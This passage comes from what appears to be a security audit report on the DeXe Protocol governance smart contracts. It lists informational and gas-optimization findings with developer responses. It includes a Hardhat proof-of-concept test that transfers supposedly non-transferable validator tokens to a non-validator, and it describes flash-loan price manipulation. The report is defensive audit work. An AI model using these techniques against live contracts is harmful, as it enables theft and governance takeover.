        // in similar systems: that doing a bunch of smaller operations should have the same outcome as
        // doing one equally big operation, eg: 25 different users each delegating 4 tokens to the voter
        // should have the same outcome as 1 user delegating 100 tokens to the voter? */
      });
```

Run with: `npx hardhat test --grep "audit small delegations prevent delegatee"`

**Recommended Mitigation:** Consider enforcing a minimum delegation amount similar to how there is a minimum voting amount.

Perhaps in `GovUserKeeper::delegateTokens()` [L136](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L136) & `undelegateTokens()` [L160](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L160) , enforce that `_micropoolsInfo[delegatee].tokenBalance == 0 || _micropoolsInfo[delegatee].tokenBalance > minimumVoteAmount`

By enforcing this here in both delegate & undelegate, this would prevent the situation where this state could be reached by delegating X, then undelegating Y such that X-Y > 0 but very small.

**Dexe:**
Acknowledged; this is straightaway a precision error in calculations. Depending on the rewards configuration, 1 or 2 wei may get lost in the process.

\clearpage
## Informational


### `GovValidators` can transfer non-transferable `GovValidatorToken` to non-validators making them validators

**Description:** `GovValidators` can transfer non-transferable `GovValidatorToken` to non-validators making them validators.

**Impact:** Non-transferable tokens can be transferred making non-validators into validators. This is marked as INFO though as so far we haven't been able to find a way to get the `GovValidators` contract to actually make this call in practice, and it requires a validator to approve token spending for `GovValidatorToken` to the `GovValidators` contract.

**Proof of Concept:** Add to `GovValidators.test.js`:
```javascript
    describe("audit transfer nontransferable GovValidatorToken", () => {
      it("audit GovValidators can transfer GovValidatorToken to non-validators making them Validators", async () => {
        // SECOND is a validator as they have GovValidatorToken
        assert.equal(await validators.isValidator(SECOND), true);
        assert.equal((await validatorsToken.balanceOf(SECOND)).toFixed(), wei("100"));

        // NOT_VALIDATOR is a new address that isn't a validator
        let NOT_VALIDATOR = await accounts(3);
        assert.equal(await validators.isValidator(NOT_VALIDATOR), false);

        const { impersonate } = require("../helpers/impersonator");
        // SECOND gives approval to GovValidators over their GovValidatorToken
        await impersonate(SECOND);
        await validatorsToken.approve(validators.address, wei("10"), { from: SECOND });

        // GovValidators can transfer SECOND's GovValidatorToken to NON_VALIDATOR
        await impersonate(validators.address);
        await validatorsToken.transferFrom(SECOND, NOT_VALIDATOR, wei("10"), { from: validators.address });

        // this makes NON_VALIDATOR a VALIDATOR
        assert.equal((await validatorsToken.balanceOf(NOT_VALIDATOR)).toFixed(), wei("10"));
        assert.equal(await validators.isValidator(NOT_VALIDATOR), true);
      });
    });
```

Run with: `npx hardhat test --grep "audit transfer nontransferable GovValidatorToken"`

**Recommended Mitigation:** Rethink the implementation of [`GovValidatorsToken::_beforeTokenTransfer()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/validators/GovValidatorsToken.sol#L32-L38) to allow minting & burning but prevent transfers.

**Dexe:**
Fixed in commit [dca45e5](https://github.com/dexe-network/DeXe-Protocol/commit/dca45e546c1ad44ae8d724f8942c80ec6841ee1b).

**Cyfrin:** Verified.


### `UniswapV2Router::getAmountsOut()` based upon pool reserves allowing returned price to be manipulated via flash loan

**Description:** [`PriceFeed`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol) uses [`UniswapV2PathFinder`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/price-feed/UniswapV2PathFinder.sol) which itself uses `UniswapV2Router::getAmountsOut()` & `getAmountsIn()` which are [based upon pool reserves](https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L62-L70), allowing an attacker to manipulate the returned prices via flash loans.

**Impact:** An attacker can manipulate the returned prices via flash loans. Marked as Informational since `PriceFeed` doesn't appear to be used anywhere in current codebase, so there is no current impact on the system.

**Recommended Mitigation:** Use [Uniswap TWAP](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles) or Chainlink price oracle for manipulation-resistant pricing data.

**Dexe:**
Functionality removed.


### Create Proposal has the exact same reward as moving a proposal to validators creating disproportionate incentives

**Description:** Users initiating a new proposal via`GovPool::createProposal` are rewarded the same incentives as users who merely move a proposal after successful pool voting to validators.

Note that creating a new proposal involves a lot of effort in terms of designing a proposal acceptable to the broader DAO community, setting up the proposal URL, and creating for & against actions for a proposal. The amount of gas consumed for proposal creation is higher than moving a successful proposal to validators.

**Impact:** Having the same rewards for both the above actions creates misaligned incentives.

**Recommended Mitigation:** Consider changing rewards for `GovPool::moveProposalToValidators` to type `Rewards.Execute`. In effect, rewards for moving a proposal to validators is the same as rewards for executing a successful proposal.

**Dexe:**
Fixed in [PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b).

**Cyfrin:** Verified.


### Missing `address(0)` checks when assigning values to address state variables

**Description:** Missing `address(0)` checks when assigning values to address state variables.

**Impact:** Address state variables may be unexpectedly set to `address(0)`.

**Proof of Concept:**
```solidity
File: gov/GovPool.sol

344:         _nftMultiplier = nftMultiplierAddress;

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

63:         govAddress = _govAddress;

```

From Solarity library:

```solidity
File: contracts-registry/pools/AbstractPoolContractsRegistry.sol

51:         _contractsRegistry = contractsRegistry_;

```

```solidity
File: contracts-registry/pools/pool-factory/AbstractPoolFactory.sol

31:         _contractsRegistry = contractsRegistry_;

```

```solidity
File: contracts-registry/pools/proxy/ProxyBeacon.sol

33:         _implementation = newImplementation_;

```

**Recommended Mitigation:** Consider adding above `address(0)` checks.

**Dexe:**
Acknowledged; the provided examples are either related to PoolFactory (where no address(0) are possible) or to an NFTMultiplier which is intended to be zero under some business conditions.


### Events are missing indexed fields

**Description:** Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields).

**Impact:** Slower access for off-chain tools that parse events.

**Proof of Concept:**
```solidity
File: factory/PoolFactory.sol

43:     event DaoPoolDeployed(

```

```solidity
File: gov/ERC721/multipliers/AbstractERC721Multiplier.sol

25:     event Minted(uint256 tokenId, address to, uint256 multiplier, uint256 duration);

26:     event Locked(uint256 tokenId, address sender, bool isLocked);

27:     event Changed(uint256 tokenId, uint256 multiplier, uint256 duration);

```

```solidity
File: gov/ERC721/multipliers/DexeERC721Multiplier.sol

21:     event AverageBalanceChanged(address user, uint256 averageBalance);

```

```solidity
File: gov/GovPool.sol

87:     event Delegated(address from, address to, uint256 amount, uint256[] nfts, bool isDelegate);

88:     event DelegatedTreasury(address to, uint256 amount, uint256[] nfts, bool isDelegate);

89:     event Deposited(uint256 amount, uint256[] nfts, address sender);

90:     event Withdrawn(uint256 amount, uint256[] nfts, address sender);

```

```solidity
File: gov/proposals/DistributionProposal.sol

31:     event DistributionProposalClaimed(

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

44:     event TierCreated(

49:     event Bought(uint256 tierId, address buyer);

50:     event Whitelisted(uint256 tierId, address user);

```

```solidity
File: gov/settings/GovSettings.sol

16:     event SettingsChanged(uint256 settingsId, string description);

17:     event ExecutorChanged(uint256 settingsId, address executor);

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

52:     event SetERC20(address token);

53:     event SetERC721(address token);

```

```solidity
File: gov/validators/GovValidators.sol

38:     event ExternalProposalCreated(uint256 proposalId, uint256 quorum);

39:     event InternalProposalCreated(

46:     event InternalProposalExecuted(uint256 proposalId, address executor);

48:     event Voted(uint256 proposalId, address sender, uint256 vote, bool isInternal, bool isVoteFor);

49:     event VoteCanceled(uint256 proposalId, address sender, bool isInternal);

```

```solidity
File: interfaces/gov/ERC721/IERC721Expert.sol

20:     event TagsAdded(uint256 indexed tokenId, string[] tags);

```

```solidity
File: libs/gov/gov-pool/GovPoolCreate.sol

24:     event ProposalCreated(

34:     event MovedToValidators(uint256 proposalId, address sender);

```

```solidity
File: libs/gov/gov-pool/GovPoolExecute.sol

24:     event ProposalExecuted(uint256 proposalId, bool isFor, address sender);

```

```solidity
File: libs/gov/gov-pool/GovPoolMicropool.sol

23:     event DelegatorRewardsClaimed(

```

```solidity
File: libs/gov/gov-pool/GovPoolOffchain.sol

16:     event OffchainResultsSaved(string resultsHash, address sender);

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

19:     event RewardClaimed(uint256 proposalId, address sender, address token, uint256 rewards);

20:     event VotingRewardClaimed(

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

19:     event VoteChanged(uint256 proposalId, address voter, bool isVoteFor, uint256 totalVoted);

20:     event QuorumReached(uint256 proposalId, uint256 timestamp);

21:     event QuorumUnreached(uint256 proposalId);

```

```solidity
File: libs/gov/gov-validators/GovValidatorsExecute.sol

16:     event ChangedValidatorsBalances(address[] validators, uint256[] newBalance);

```

```solidity
File: user/UserRegistry.sol

15:     event UpdatedProfile(address user, string url);

16:     event Agreed(address user, bytes32 documentHash);

17:     event SetDocumentHash(bytes32 hash);

```

From Solarity library:

```solidity
File: contracts-registry/AbstractContractsRegistry.sol

44:     event ContractAdded(string name, address contractAddress);

45:     event ProxyContractAdded(string name, address contractAddress, address implementation);

46:     event ProxyContractUpgraded(string name, address newImplementation);

47:     event ContractRemoved(string name);

```

```solidity
File: contracts-registry/pools/proxy/ProxyBeacon.sol

19:     event Upgraded(address implementation);

```

```solidity
File: diamond/Diamond.sol

39:     event DiamondCut(Facet[] facets, address initFacet, bytes initData);

```

```solidity
File: diamond/utils/InitializableStorage.sol

23:     event Initialized(bytes32 storageSlot);

```

```solidity
File: interfaces/access-control/IMultiOwnable.sol

8:     event OwnersAdded(address[] newOwners);

9:     event OwnersRemoved(address[] removedOwners);

```

```solidity
File: interfaces/access-control/IRBAC.sol

15:     event GrantedRoles(address to, string[] rolesToGrant);

16:     event RevokedRoles(address from, string[] rolesToRevoke);

18:     event AddedPermissions(string role, string resource, string[] permissionsToAdd, bool allowed);

19:     event RemovedPermissions(

```

```solidity
File: interfaces/access-control/extensions/IRBACGroupable.sol

8:     event AddedToGroups(address who, string[] groupsToAddTo);

9:     event RemovedFromGroups(address who, string[] groupsToRemoveFrom);

11:     event GrantedGroupRoles(string groupTo, string[] rolesToGrant);

12:     event RevokedGroupRoles(string groupFrom, string[] rolesToRevoke);

14:     event ToggledDefaultGroup(bool defaultGroupEnabled);

```

```solidity
File: interfaces/compound-rate-keeper/ICompoundRateKeeper.sol

8:     event CapitalizationPeriodChanged(uint256 newCapitalizationPeriod);

9:     event CapitalizationRateChanged(uint256 newCapitalizationRate);

```


**Recommended Mitigation:** Consider indexing fields in the listed events.

**Dexe:**
Acknowledged; there are many services that we use which rely on the exact signature of events. Changing the events would require changing the services; we may do it in the future.


### `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`

**Description:** `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`.

Use `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`).

Unless there is a compelling reason, `abi.encode` should be preferred. If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739). If all arguments are strings and or bytes, `bytes.concat()` should be used instead.

**Proof of Concept:**
```solidity
File: factory/PoolFactory.sol

263:         return keccak256(abi.encodePacked(deployer, poolName));

```

```solidity
File: libs/gov/gov-pool/GovPoolOffchain.sol

41:         return keccak256(abi.encodePacked(resultsHash, block.chainid, address(this)));

```

```solidity
File: user/UserRegistry.sol

44:         _signatureHashes[_documentHash][msg.sender] = keccak256(abi.encodePacked(signature));

```

**Recommended Mitigation:** See description.

**Dexe:**
Acknowledged; there is only one dynamic type string in the encoding, so everything is safe. Also, packed encoding is much simpler to handle on the back end.


### Use of deprecated library function `safeApprove()`

**Description:** `safeApprove()` has been deprecated and the official OpenZeppelin documentation [recommends](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-) using `safeIncreaseAllowance()` & `safeDecreaseAllowance()`.

**Impact:** INFO

**Proof of Concept:**
```solidity
File: core/PriceFeed.sol

385:             IERC20(token).safeApprove(address(uniswapV2Router), MAX_UINT);

```

**Recommended Mitigation:** Consider replacing deprecated functions of OpenZeppelin contracts.

**Dexe:**
Fixed as contract removed from codebase.

**Cyfrin:** Verified.


### Use `safeTransfer()` instead of `transfer()` for ERC20

**Description:** Use `safeTransfer` instead of `transfer` for ERC20.

**Impact:** INFO

**Proof of Concept:**
```solidity
File: gov/GovPool.sol

248:             IERC20(token).transfer(address(_govUserKeeper), amount.from18(token.decimals()));

```

**Recommended Mitigation:** Use `safeTransfer` instead of `transfer` for ERC20.

**Dexe:**
Fixed in commit [9078949](https://github.com/dexe-network/DeXe-Protocol/commit/9078949d6c968a914d2c5c1977b7331a6cbea7f6#diff-1112b85df220ebfd2bce44ff6c1e827cacbee838afaf25f75dd7e7e0d8017dbc).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Unnecessary libraries in `CoreProperties` contract can be removed

**Description:** `CoreProperties` includes the following unnecessary libraries that are not being called in the contract logic:

 - `Math`
 - `AddressSetHelper`
 - `EnumerableSet`
 - `Paginator`


**Impact:** Libraries needlessly increase the contract bytecode and consume higher gas during deployment.

**Recommended Mitigation:** Consider refactoring the code and removing unused libraries.

**Dexe:**
Fixed in commit [b417eaf](https://github.com/dexe-network/DeXe-Protocol/commit/b417eafe501100b8c36ec92494798bbd73add796).

**Cyfrin:** Verified.


### Unnecessary encoding of `participationDetails` in `TokenSaleProposalCreate::_setParticipationInfo`

**Description:** In `TokenSaleProposalCreate::_setParticipationInfo` implementation, when participation type is `TokenLock`, current logic is decoding the `data` to extract the amount, convert this amount to 18 decimals and  encoding back again with the new amount.


```solidity
    function _setParticipationInfo(
        ITokenSaleProposal.Tier storage tier,
        ITokenSaleProposal.TierInitParams memory tierInitParams
    ) private {
    ITokenSaleProposal.ParticipationInfo storage participationInfo = tier.participationInfo;

        for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {
            ITokenSaleProposal.ParticipationDetails memory participationDetails = tierInitParams
                .participationDetails[i];

               if(){
                  ....
               }
               else if (
                participationDetails.participationType ==
                ITokenSaleProposal.ParticipationType.TokenLock
            ) {
                require(participationDetails.data.length == 64, "TSP: invalid token lock data");

                (address token, uint256 amount) = abi.decode(
                    participationDetails.data,
                    (address, uint256)
                );

                uint256 to18Amount = token == ETHEREUM_ADDRESS
                    ? amount
                    : amount.to18(token.decimals());

     >>           participationDetails.data = abi.encode(token, to18Amount); // @audit encoding not needed

                require(to18Amount > 0, "TSP: zero token lock amount");
                require(
                    participationInfo.requiredTokenLock.set(token, to18Amount),
                    "TSP: multiple token lock requirements"
                );
            }
      }
   }
```

The encoding is not required as `participationDetails` is stored in memory and has no existence once the `_setParticipationInfo` is executed.

**Impact:** Gas consumption

**Recommended Mitigation:** Consider removing data encoding after the amount is normalised to 18 decimals.

**Dexe:**
Fixed in [PR155](https://github.com/dexe-network/DeXe-Protocol/commit/aa20564e99d6b7a54f8abaf2d538e3c2c7908718#diff-385858f2f510060a9e5f709e05eb51be54a74332460ee4e9b28c7602638a6521).

**Cyfrin:** Verified.


### Cache array length outside of loops

**Description:** If array length is not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).

**Impact:** Gas optimization

**Proof of Concept:**
```solidity
File: core/PriceFeed.sol

95:         require(foundPath.path.length > 0, "PriceFeed: unreachable asset");

141:         require(foundPath.path.length > 0, "PriceFeed: unreachable asset");

227:             foundPath.amounts.length > 0

228:                 ? (foundPath.amounts[foundPath.amounts.length - 1], foundPath.path)

258:             foundPath.amounts.length > 0 // @audit why is this different than getExtendedPriceOut()

```

```solidity
File: gov/ERC20/ERC20Gov.sol

55:         for (uint256 i = 0; i < params.users.length; i++) {

```

```solidity
File: gov/GovPool.sol

256:             for (uint256 i; i < nftIds.length; i++) {

305:         for (uint256 i; i < proposalIds.length; i++) {

318:         for (uint256 i; i < proposalIds.length; i++) {

415:         return _userInfos[user].votedInProposals.length();

```

```solidity
File: gov/proposals/DistributionProposal.sol

79:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: gov/proposals/TokenSaleProposal.sol

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

```

```solidity
File: gov/settings/GovSettings.sol

36:         for (; settingsId < proposalSettings.length; settingsId++) {

63:         for (uint256 i; i < _settings.length; i++) {

75:         for (uint256 i; i < _settings.length; i++) {

87:         for (uint256 i; i < executors.length; i++) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

210:         for (uint256 i; i < nftIds.length; i++) {

229:         for (uint256 i; i < nftIds.length; i++) {

259:         for (uint256 i; i < nftIds.length; i++) {

291:         for (uint256 i; i < nftIds.length; i++) {

316:         for (uint256 i; i < nftIds.length; i++) {

346:         for (uint256 i; i < nftIds.length; i++) {

389:         for (uint256 i; i < lockedProposals.length; i++) {

429:         for (uint256 i; i < nftIds.length; i++) {

445:         for (uint256 i; i < nftIds.length; i++) {

461:         for (uint256 i = 0; i < nftIds.length; i++) {

519:         totalBalance = _getBalanceInfoStorage(voter, voteType).nftBalance.length();

529:             totalBalance += _usersInfo[voter].allDelegatedNfts.length();

594:             for (uint256 i; i < nftIds.length; i++) {

708:             delegatorInfo.delegatedNfts[delegatee].length() == 0

```

```solidity
File: libs/gov/gov-pool/GovPoolCreate.sol

69:         for (uint256 i; i < actionsOnFor.length; i++) {

73:         for (uint256 i; i < actionsOnAgainst.length; i++) {

161:         for (uint256 i; i < actions.length; i++) {

218:         for (uint256 i; i < actions.length; i++) {

273:         for (uint256 i; i < actions.length - 1; i++) {

298:         for (uint256 i; i < actionsFor.length; i++) {

325:         for (uint256 i; i < actions.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolCredit.sol

25:         uint256 length = creditInfo.tokenList.length;

33:         for (uint256 i = 0; i < tokens.length; i++) {

44:         uint256 infoLength = creditInfo.tokenList.length;

```

```solidity
File: libs/gov/gov-pool/GovPoolMicropool.sol

100:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolRewards.sol

165:         for (uint256 i = 0; i < proposalIds.length; i++) {

189:         for (uint256 i = 0; i < rewards.offchainTokens.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolUnlock.sol

27:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolView.sol

147:         for (uint256 i; i < unlockedIds.length; i++) {

```

```solidity
File: libs/gov/gov-pool/GovPoolVote.sol

88:         for (uint256 i = 0; i < proposalIds.length; i++) {

174:         for (uint256 i; i < nftIds.length; i++) {

```

```solidity
File: libs/gov/gov-user-keeper/GovUserKeeperView.sol

35:         for (uint256 i = 0; i < users.length; i++) {

84:         for (uint256 i = 0; i < votingPowers.length; i++) {

94:             for (uint256 j = 0; j < power.perNftPower.length; j++) {

126:                     for (uint256 i; i < nftIds.length; i++) {

139:                 for (uint256 i; i < nftIds.length; i++) {

163:         delegationsInfo = new IGovUserKeeper.DelegationInfoView[](userInfo.delegatees.length());

165:         for (uint256 i; i < delegationsInfo.length; i++) {

192:         for (uint256 i; i < lockedProposals.length; i++) {

199:         uint256 nftsLength = balanceInfo.nftBalance.length();

206:                 for (uint256 j = 0; j < unlockedNfts.length; j++) {

```

```solidity
File: libs/gov/gov-validators/GovValidatorsUtils.sol

74:         for (uint256 i = 0; i < userAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol

171:         if (participationInfo.requiredTokenLock.length() > 0) {

175:         if (participationInfo.requiredNftLock.length() > 0) {

200:         uint256 lockedTokenLength = purchaseInfo.lockedTokens.length();

212:         uint256 lockedNftLength = purchaseInfo.lockedNftAddresses.length();

224:         uint256 purchaseTokenLength = purchaseInfo.spentAmounts.length();

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalCreate.sol

65:         for (uint256 i = 0; i < _tierInitParams.participationDetails.length; i++) {

109:         for (uint256 i = 0; i < tierInitParams.participationDetails.length; i++) {

187:         for (uint256 i = 0; i < tierInitParams.purchaseTokenAddresses.length; i++) {

```

```solidity
File: libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol

75:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

84:         for (uint256 i = 0; i < nftIdsToLock.length; i++) {

136:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

144:         for (uint256 i = 0; i < nftIdsToUnlock.length; i++) {

157:         for (uint256 i = 0; i < request.users.length; i++) {

```

```solidity
File: libs/price-feed/UniswapV2PathFinder.sol

86:                 if (foundPath.path.length == 0 || compare(amounts, foundPath.amounts)) {

99:                 if (foundPath.path.length == 0 || compare(amounts, foundPath.amounts)) {

```

```solidity
File: libs/utils/AddressSetHelper.sol

10:         for (uint256 i = 0; i < array.length; i++) {

19:         for (uint256 i = 0; i < array.length; i++) {

```

From Solarity library:

```solidity
File: access-control/RBAC.sol

103:         for (uint256 i = 0; i < permissionsToAdd_.length; i++) {

124:         for (uint256 i = 0; i < permissionsToRemove_.length; i++) {

173:         for (uint256 i = 0; i < allowed_.length; i++) {

178:         for (uint256 i = 0; i < disallowed_.length; i++) {

200:         for (uint256 i = 0; i < roles_.length; i++) {

```

```solidity
File: access-control/extensions/RBACGroupable.sol

157:         for (uint256 i = 0; i < roles_.length; i++) {

169:         for (uint256 i = 0; i < groups_.length; i++) {

172:             for (uint256 j = 0; j < roles_.length; j++) {

```

```solidity
File: contracts-registry/pools/AbstractPoolContractsRegistry.sol

125:         for (uint256 i = 0; i < names_.length; i++) {

```

```solidity
File: diamond/Diamond.sol

78:         for (uint256 i; i < facets_.length; i++) {

110:         for (uint256 i = 0; i < selectors_.length; i++) {

134:         for (uint256 i = 0; i < selectors_.length; i++) {

161:         for (uint256 i; i < selectors_.length; i++) {

```

```solidity
File: diamond/DiamondStorage.sol

53:         facets_ = new FacetInfo[](_facets.length());

55:         for (uint256 i = 0; i < facets_.length; i++) {

75:         for (uint256 i = 0; i < selectors_.length; i++) {

```

```solidity
File: libs/arrays/ArrayHelper.sol

98:         for (uint256 i = 1; i < prefixes_.length; i++) {

160:         for (uint256 i = 0; i < what_.length; i++) {

172:         for (uint256 i = 0; i < what_.length; i++) {

184:         for (uint256 i = 0; i < what_.length; i++) {

196:         for (uint256 i = 0; i < what_.length; i++) {

```

```solidity
File: libs/arrays/SetHelper.sol

22:         for (uint256 i = 0; i < array_.length; i++) {

28:         for (uint256 i = 0; i < array_.length; i++) {

34:         for (uint256 i = 0; i < array_.length; i++) {

45:         for (uint256 i = 0; i < array_.length; i++) {

51:         for (uint256 i = 0; i < array_.length; i++) {

57:         for (uint256 i = 0; i < array_.length; i++) {

```

```solidity
File: mock/libs/data-structures/StringSetMock.sol

38:         for (uint256 i = 0; i < set_.length; i++) {

```

```solidity
File: mock/libs/data-structures/memory/VectorMock.sol

42:         for (uint256 i = 0; i < vector2_.length(); i++) {

70:         for (uint256 i = 0; i < vector_.length(); i++) {

100:         for (uint256 i = 0; i < array_.length; i++) {

```

```solidity
File: mock/libs/zkp/snarkjs/VerifierMock.sol

34:         for (uint256 i = 0; i < inputs_.length; i++) {

54:         for (uint256 i = 0; i < inputs_.length; i++) {

```

```solidity
File: oracles/UniswapV2Oracle.sol

137:         return _pairInfos[pair_].blockTimestamps.length;

```

**Recommended Mitigation:** Cache array length outside of loops or when array length is accessed multiple times.

**Dexe:**
Acknowledged; we do not consider optimizations of 2-3 wei as a huge benefit. Code readability is a priority in this case.


### State variables should be cached in stack variables rather than re-reading them from storage

**Description:** The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.

**Impact:** Gas optimization

**Proof of Concept:**
```solidity
File: core/PriceFeed.sol

385:             IERC20(token).safeApprove(address(uniswapV2Router), MAX_UINT);

```

```solidity
File: gov/GovPool.sol

257:                 nft.safeTransferFrom(address(this), address(_govUserKeeper), nftIds[i]);

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

567:         ERC721Power nftContract = ERC721Power(nftAddress);

```

**Recommended Mitigation:** State variables should be cached in stack variables rather than re-reading them from storage.

**Dexe:**
Acknowledged; we do not consider optimizations of 2-3 wei as a huge benefit. Code readability is a priority in this case. Wherever optimizations made sense, we optimized the code.


### Use unchecked block to increment loop counter when overflow impossible

**Description:** Use unchecked block to increment loop counter when overflow impossible. Prefer `++i` to `i++` for loop counter increment. Included as [standard optimization](https://soliditylang.org/blog/2023/10/25/solidity-0.8.22-release-announcement/) in Solidity 0.8.22 under certain conditions.

**Impact:** Gas optimization

**Proof of Concept:**
```solidity
File: gov/ERC20/ERC20Gov.sol

55:         for (uint256 i = 0; i < params.users.length; i++) {

55:         for (uint256 i = 0; i < params.users.length; i++) {

```

```solidity
File: gov/GovPool.sol

256:             for (uint256 i; i < nftIds.length; i++) {

256:             for (uint256 i; i < nftIds.length; i++) {

305:         for (uint256 i; i < proposalIds.length; i++) {

305:         for (uint256 i; i < proposalIds.length; i++) {

318:         for (uint256 i; i < proposalIds.length; i++) {

318:         for (uint256 i; i < proposalIds.length; i++) {

```

```solidity
File: gov/proposals/DistributionProposal.sol

79:         for (uint256 i; i < proposalIds.length; i++) {

79:         for (uint256 i; i < proposalIds.length; i++) {

```


```solidity
File: gov/proposals/TokenSaleProposal.sol

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

82:         for (uint256 i = 0; i < tierInitParams.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

96:         for (uint256 i = 0; i < requests.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

102:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

108:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

114:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

120:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

184:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

195:         for (uint256 i = 0; i < tierIds.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

205:         for (uint256 i = 0; i < recoveringAmounts.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

223:         for (uint256 i = 0; i < userViews.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

250:         for (uint256 i = 0; i < ids.length; i++) {

```

```solidity
File: gov/settings/GovSettings.sol

36:         for (; settingsId < proposalSettings.length; settingsId++) {

36:         for (; settingsId < proposalSettings.length; settingsId++) {

63:         for (uint256 i; i < _settings.length; i++) {

63:         for (uint256 i; i < _settings.length; i++) {

65:             _setSettings(_settings[i], settingsId++);

65:             _setSettings(_settings[i], settingsId++);

75:         for (uint256 i; i < _settings.length; i++) {

75:         for (uint256 i; i < _settings.length; i++) {

87:         for (uint256 i; i < executors.length; i++) {

87:         for (uint256 i; i < executors.length; i++) {

```

```solidity
File: gov/user-keeper/GovUserKeeper.sol

210:         for (uint256 i; i < nftIds.length; i++) {

210:         for (uint256 i; i < nftIds.length; i++) {

229:         for (uint256 i; i < nftIds.length; i++) {

229:         for (uint256 i; i < nftIds.length; i++) {

259:         for (uint256 i; i < nftIds.length; i++) {

259:         for (uint256 i; i < nftIds.length; i++) {

291:         for (uint256 i; i < nftIds.length; i++) {

291:         for (uint256 i; i < nftIds.length; i++) {

316:         for (uint256 i; i < nftIds.length; i++) {

316:         for (uint256 i; i < nftIds.length; i++) {

346:         for (uint256 i; i < nftIds.length; i++) {

346:         for (uint256 i; i < nftIds.length; i++) {

389:         for (uint256 i; i < lockedProposals.length; i++) {

389:         for (uint256 i; i < lockedProposals.length; i++) {

429:         for (uint256 i; i < nftIds.length; i++) {

429:         for (uint256 i; i < nftIds.length; i++) {

445:         for (uint256 i; i < nftIds.length; i++) {

445:         for (uint256 i; i < nftIds.length; i++) {

461:         for (uint256 i = 0; i < nftIds.length; i++) {

461:         for (uint256 i = 0; i < nftIds.length; i++) {

569:         for (uint256 i; i < ownedLength; i++) {

569:         for (uint256 i; i < ownedLength; i++) {

594:             for (uint256 i; i < nftIds.length; i++) {

594:             for (uint256 i; i < nftIds.length; i++) {

```

```solidity
File: gov/validators/GovValidators.sol

